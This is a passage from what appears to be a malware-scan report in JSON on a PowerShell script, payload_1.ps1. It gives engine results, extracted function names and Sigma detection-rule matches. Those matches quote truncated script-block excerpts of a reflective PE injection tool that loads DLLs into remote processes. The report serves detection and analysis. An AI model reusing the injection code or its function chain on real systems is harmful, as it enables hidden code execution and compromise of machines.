                                                                                   "engine_version":  "0.9.0.1003",
                                                                                   "engine_update":  "20251215",
                                                                                   "category":  "type-unsupported",
                                                                                   "result":  null
                                                                               },
                                                                  "Alibaba":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Alibaba",
                                                                                  "engine_version":  "0.3.0.5",
                                                                                  "engine_update":  "20190527",
                                                                                  "category":  "type-unsupported",
                                                                                  "result":  null
                                                                              },
                                                                  "Trapmine":  {
                                                                                   "method":  "blacklist",
                                                                                   "engine_name":  "Trapmine",
                                                                                   "engine_version":  "4.0.7.0",
                                                                                   "engine_update":  "20251125",
                                                                                   "category":  "type-unsupported",
                                                                                   "result":  null
                                                                               },
                                                                  "Cylance":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "Cylance",
                                                                                  "engine_version":  "3.0.0.0",
                                                                                  "engine_update":  "20251205",
                                                                                  "category":  "type-unsupported",
                                                                                  "result":  null
                                                                              },
                                                                  "SentinelOne":  {
                                                                                      "method":  "blacklist",
                                                                                      "engine_name":  "SentinelOne",
                                                                                      "engine_version":  "7.4.1.3",
                                                                                      "engine_update":  "20251013",
                                                                                      "category":  "type-unsupported",
                                                                                      "result":  null
                                                                                  },
                                                                  "tehtris":  {
                                                                                  "method":  "blacklist",
                                                                                  "engine_name":  "tehtris",
                                                                                  "engine_version":  "v0.1.4",
                                                                                  "engine_update":  "20251215",
                                                                                  "category":  "type-unsupported",
                                                                                  "result":  null
                                                                              },
                                                                  "Trustlook":  {
                                                                                    "method":  "blacklist",
                                                                                    "engine_name":  "Trustlook",
                                                                                    "engine_version":  "1.0",
                                                                                    "engine_update":  "20251215",
                                                                                    "category":  "type-unsupported",
                                                                                    "result":  null
                                                                                }
                                                              },
                                    "powershell_info":  {
                                                            "functions":  [
                                                                              "Add-SignedIntAsUnsigned",
                                                                              "Compare-Val1GreaterThanVal2AsUInt",
                                                                              "Convert-UIntToInt",
                                                                              "Copy-ArrayOfMemAddresses",
                                                                              "Copy-Sections",
                                                                              "Create-RemoteThread",
                                                                              "Enable-SeDebugPrivilege",
                                                                              "Get-DelegateType",
                                                                              "Get-Hex",
                                                                              "Get-ImageNtHeaders",
                                                                              "Get-MemoryProcAddress",
                                                                              "Get-PEBasicInfo",
                                                                              "Get-PEDetailedInfo",
                                                                              "Get-ProcAddress",
                                                                              "Get-RemoteProcAddress",
                                                                              "Get-VirtualProtectValue",
                                                                              "Get-Win32Constants",
                                                                              "Get-Win32Functions",
                                                                              "Get-Win32Types",
                                                                              "Import-DllImports",
                                                                              "Import-DllInRemoteProcess",
                                                                              "Invoke-MemoryFreeLibrary",
                                                                              "Invoke-MemoryLoadLibrary",
                                                                              "Invoke-ReflectivePEInjection",
                                                                              "Main",
                                                                              "Main",
                                                                              "Sub-SignedIntAsUnsigned",
                                                                              "Test-MemoryRangeValid",
                                                                              "Update-ExeFunctions",
                                                                              "Update-MemoryAddresses",
                                                                              "Update-MemoryProtectionFlags",
                                                                              "Write-BytesToMemory"
                                                                          ],
                                                            "cmdlets":  [
                                                                            "add-member",
                                                                            "get-childitem",
                                                                            "get-process",
                                                                            "invoke-command",
                                                                            "new-object",
                                                                            "out-null",
                                                                            "resolve-path",
                                                                            "select-object",
                                                                            "set-strictmode",
                                                                            "start-sleep",
                                                                            "where-object",
                                                                            "write-error",
                                                                            "write-output",
                                                                            "write-verbose",
                                                                            "write-warning"
                                                                        ],
                                                            "dotnet_calls":  [
                                                                                 "System.IO.File",
                                                                                 "System.MulticastDelegate",
                                                                                 "System.Object",
                                                                                 "System.Reflection.CallingConventions",
                                                                                 "System.Reflection.Emit.AssemblyBuilderAccess",
                                                                                 "System.Runtime.InteropServices.HandleRef",
                                                                                 "System.Runtime.InteropServices.Marshal",
                                                                                 "System.Runtime.InteropServices.MarshalAsAttribute",
                                                                                 "System.Runtime.InteropServices.UnmanagedType",
                                                                                 "System.ValueType"
                                                                             ],
                                                            "ps_variables":  [
                                                                                 "$debugpreference",
                                                                                 "$null"
                                                                             ],
                                                            "cmdlets_alias":  [
                                                                                  "where"
                                                                              ]
                                                        },
                                    "type_tag":  "powershell",
                                    "size":  136799,
                                    "filecondis":  {
                                                       "dhash":  "9ed6ac8e868ea3a8",
                                                       "raw_md5":  "9723609d917395c23dde0f47fbd98e9f"
                                                   },
                                    "magic":  "C source, ASCII text",
                                    "type_tags":  [
                                                      "source",
                                                      "powershell",
                                                      "ps",
                                                      "ps1"
                                                  ],
                                    "first_submission_date":  1747143312,
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "6c44b18934e9ddd288d035d35a258c41fce2d5f5ebafc55ff866a95fb78db9c2",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential WinAPI Calls Via PowerShell Scripts",
                                                                       "rule_description":  "Detects use of WinAPI functions in PowerShell scripts",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems), Nikita Nazarov, oscd.community",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=ypeBuilder.DefineField(\u0027AddressOfNameOrdinals\u0027, [UInt32], \u0027Public\u0027) | Out-Null\r\n\t\t$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()\r\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY\r\n\t\t\r\n\t\t#Struct LUID\r\n\t\t$Attributes = \u0027AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit\u0027\r\n\t\t$TypeBuilder = $ModuleBuilder.DefineType(\u0027LUID\u0027, $Attributes, [System.ValueType], 8)\r\n\t\t$TypeBuilder.DefineField(\u0027LowPart\u0027, [UInt32 [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=3; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)\r\n\t\t{\r\n\t\t\t$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value \u0027DLL\u0027\r\n\t\t}\r\n\t\telseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)\r\n\t\t{\r\n\t\t\t$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value \u0027EXE\u0027\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tThrow \"PE file is [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=5; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=support ASLR. Cannot load a non-ASLR PE in to a remote process\" -ErrorAction Stop\r\n        }\r\n\r\n\t\t$PEHandle = [IntPtr]::Zero\t\t\t\t#This is where the PE is allocated in PowerShell\r\n\t\t$EffectivePEHandle = [IntPtr]::Zero\t\t#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.\r\n\t\tif ($RemoteLoading -eq $true)\r\n\t\t{\r\n\t\t\t#Allocate space in the remote process, and also allocate spa [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; EventID=4104; MessageNumber=8}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40\r\n\t\t$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100\r\n\t\t$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000\r\n\t\t$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008\r\n\t\t$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020\r\n\t\t$Win32Constants | Add-Membe [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; MessageNumber=3; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=System.dll\u0027) }\r\n\t    $UnsafeNativeMethods = $SystemAssembly.GetType(\u0027Microsoft.Win32.UnsafeNativeMethods\u0027)\r\n\t    # Get a reference to the GetModuleHandle and GetProcAddress methods\r\n\t    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(\u0027GetModuleHandle\u0027)\r\n\t    $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0027GetProcAddress\u0027, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))\r\n\t    # Get a handle to the module specified\r\n\t    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Modul [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=4}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "bbb841b3f1cb3bdb122737ca0755cb93d982ecca4651de2822af469b59071f87",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Malicious PowerShell Commandlets - ScriptBlock",
                                                                       "rule_description":  "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                                                                       "rule_author":  "Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias Michalski, Austin Songer",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=1; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=1}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; MessageTotal=13; ScriptBlockId=9f2fbb51-ea1e-4f89-b8fc-5166ac608394; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; MessageNumber=1; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "5bd56545b7e384edee75e378b7ee025e05f6bcb012607cb6425ccedd54fdb070",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Malicious PowerShell Keywords",
                                                                       "rule_description":  "Detects keywords from well-known PowerShell exploitation frameworks",
                                                                       "rule_author":  "Sean Metcalf (source), Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=1; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=ypeBuilder.DefineField(\u0027AddressOfNameOrdinals\u0027, [UInt32], \u0027Public\u0027) | Out-Null\r\n\t\t$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()\r\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY\r\n\t\t\r\n\t\t#Struct LUID\r\n\t\t$Attributes = \u0027AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit\u0027\r\n\t\t$TypeBuilder = $ModuleBuilder.DefineType(\u0027LUID\u0027, $Attributes, [System.ValueType], 8)\r\n\t\t$TypeBuilder.DefineField(\u0027LowPart\u0027, [UInt32 [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=3; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=lt $Value2Bytes[$i])\r\n\t\t\t\t{\r\n\t\t\t\t\t$Val += 256\r\n\t\t\t\t\t$CarryOver = 1\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$CarryOver = 0\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\t[UInt16]$Sum = $Val - $Value2Bytes[$i]\r\n\r\n\t\t\t\t$FinalBytes[$i] = $Sum -band 0x00FF\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tThrow \"Cannot subtract bytearrays of different sizes\"\r\n\t\t}\r\n\t\t\r\n\t\treturn [BitConverter]::ToInt64($FinalBytes, 0)\r\n\t}\r\n\t\r\n\r\n\tFunction Add-SignedIntAsUnsigned\r\n\t{\r\n\t\tParam(\r\n\t\t[Parameter(Position = 0, Mandatory = $true)]\r\n\t\t[Int64]\r\n\t\t$Value1,\r\n\t\t\r\n\t\t[Para [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=4; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)\r\n\t\t{\r\n\t\t\t$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value \u0027DLL\u0027\r\n\t\t}\r\n\t\telseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)\r\n\t\t{\r\n\t\t\t$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value \u0027EXE\u0027\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tThrow \"PE file is [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=5; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=yRangeValid -DebugString \"Copy-Sections::Memset\" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null\r\n\t\t\t\t$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tFunction Update-MemoryAddresses\r\n\t{\r\n\t\tParam(\r\n\t\t[Parameter(Position = 0, Mandatory = $true)]\r\n\t\t[System.Object]\r\n\t\t$PEInfo,\r\n\r\n\t\t[Parameter(Position = 1, Mandatory = $true)]\r\n\t\t[Int64]\r\n\t\t$OriginalImageBase,\r\n\r\n\t\t[Parameter(Position = 2, Mandatory = $true)]\r\n\t\t[System.Ob [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=6; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "61dae8b0a35fc9369e410406f226b559d6c9cb12837347724e7c4f9281869910",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Execute Invoke-command on Remote Host",
                                                                       "rule_description":  "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText= String return type\"\r\n\t\t\t\t    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"StringFunc\"\r\n\t\t\t\t    if ($StringFuncAddr -eq [IntPtr]::Zero)\r\n\t\t\t\t    {\r\n\t\t\t\t\t    Throw \"Couldn\u0027t find function address.\"\r\n\t\t\t\t    }\r\n\t\t\t\t    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])\r\n\t\t\t\t    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)\r\n\t\t\t\t    [IntPtr]$OutputPtr = $StringFunc.Invoke()\r\n\t\t\t\t   [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; EventID=4104; MessageNumber=9}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText= it around just incase it is needed in the future.\r\n\t\t#If the script isn\u0027t running in the same Windows logon session as the target, get SeDebugPrivilege\r\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\r\n#\t\t{\r\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\r\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\r\n#\t\t}\r\n\r\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\r\n\t\t{\r\n\t\t\t$RemoteProcHandle = $Win32Func [TRUNCATED]; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; MessageTotal=8; MessageNumber=8; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=tr]::Zero) | Out-Null\r\n\r\n\r\n\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\r\n\t\tif ($Success -eq $false)\r\n\t\t{\r\n\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE\u0027s memory. Continuing anyways.\" -WarningAction Continue\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tFunction Main\r\n\t{\r\n\t\t$Win32Functions = Get-Win32Functions\r\n\t\t$Win32Types = Get-Win32Types\r\n\t\t$Win32Constants =  Get-Win32Constants\r\n\r\n\t\t$RemoteProcHandle = [IntPtr]::Zero\r\n\r\n\t\t#If a remote process to inject in to is [TRUNCATED]; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; ScriptBlockId=9f2fbb51-ea1e-4f89-b8fc-5166ac608394; MessageTotal=13; MessageNumber=13; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "6291f85314c7d9966be831c56d3cdfb30f42c84f599273e73dac5c95e1122abf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
                                                                       "rule_description":  "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
                                                                       "rule_author":  "James Pemberton / @4A616D6573",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText= String return type\"\r\n\t\t\t\t    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"StringFunc\"\r\n\t\t\t\t    if ($StringFuncAddr -eq [IntPtr]::Zero)\r\n\t\t\t\t    {\r\n\t\t\t\t\t    Throw \"Couldn\u0027t find function address.\"\r\n\t\t\t\t    }\r\n\t\t\t\t    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])\r\n\t\t\t\t    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)\r\n\t\t\t\t    [IntPtr]$OutputPtr = $StringFunc.Invoke()\r\n\t\t\t\t   [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; EventID=4104; MessageNumber=9}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText= it around just incase it is needed in the future.\r\n\t\t#If the script isn\u0027t running in the same Windows logon session as the target, get SeDebugPrivilege\r\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\r\n#\t\t{\r\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\r\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\r\n#\t\t}\r\n\r\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\r\n\t\t{\r\n\t\t\t$RemoteProcHandle = $Win32Func [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=8}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=tr]::Zero) | Out-Null\r\n\r\n\r\n\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\r\n\t\tif ($Success -eq $false)\r\n\t\t{\r\n\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE\u0027s memory. Continuing anyways.\" -WarningAction Continue\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tFunction Main\r\n\t{\r\n\t\t$Win32Functions = Get-Win32Functions\r\n\t\t$Win32Types = Get-Win32Types\r\n\t\t$Win32Constants =  Get-Win32Constants\r\n\r\n\t\t$RemoteProcHandle = [IntPtr]::Zero\r\n\r\n\t\t#If a remote process to inject in to is [TRUNCATED]; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; ScriptBlockId=9f2fbb51-ea1e-4f89-b8fc-5166ac608394; MessageTotal=13; MessageNumber=13; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "a5f575ade1f2aaba452086d3418d8a893e94b28e30da42ad98b58df4a4fe9c2d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Suspicious PowerShell Keywords",
                                                                       "rule_description":  "Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=1; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=OfCode\u0027, [UInt32], \u0027Public\u0027)).SetOffset(4) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027SizeOfInitializedData\u0027, [UInt32], \u0027Public\u0027)).SetOffset(8) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027SizeOfUninitializedData\u0027, [UInt32], \u0027Public\u0027)).SetOffset(12) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027AddressOfEntryPoint\u0027, [UInt32], \u0027Public\u0027)).SetOffset(16) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027BaseOfCode\u0027, [UInt32], \u0027Public\u0027)).SetOffset(20) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027ImageBase\u0027, [UInt64], \u0027Publi [TRUNCATED]; MessageTotal=9; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; MessageNumber=2; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=lt $Value2Bytes[$i])\r\n\t\t\t\t{\r\n\t\t\t\t\t$Val += 256\r\n\t\t\t\t\t$CarryOver = 1\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$CarryOver = 0\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\t[UInt16]$Sum = $Val - $Value2Bytes[$i]\r\n\r\n\t\t\t\t$FinalBytes[$i] = $Sum -band 0x00FF\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tThrow \"Cannot subtract bytearrays of different sizes\"\r\n\t\t}\r\n\t\t\r\n\t\treturn [BitConverter]::ToInt64($FinalBytes, 0)\r\n\t}\r\n\t\r\n\r\n\tFunction Add-SignedIntAsUnsigned\r\n\t{\r\n\t\tParam(\r\n\t\t[Parameter(Position = 0, Mandatory = $true)]\r\n\t\t[Int64]\r\n\t\t$Value1,\r\n\t\t\r\n\t\t[Para [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=4; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=function Invoke-ReflectivePEInjection\r\n{\r\n\u003c#\r\n.SYNOPSIS\r\n\r\nThis script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, \r\nor it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, \r\nplease lead the Notes section (GENERAL NOTES) for information on how to use them.\r\n\r\n\r\n1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.\r\nBecause the DLL/EXE is loaded reflectively, it is not displayed when  [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=1}"
                                                                                             },
                                                                                             {
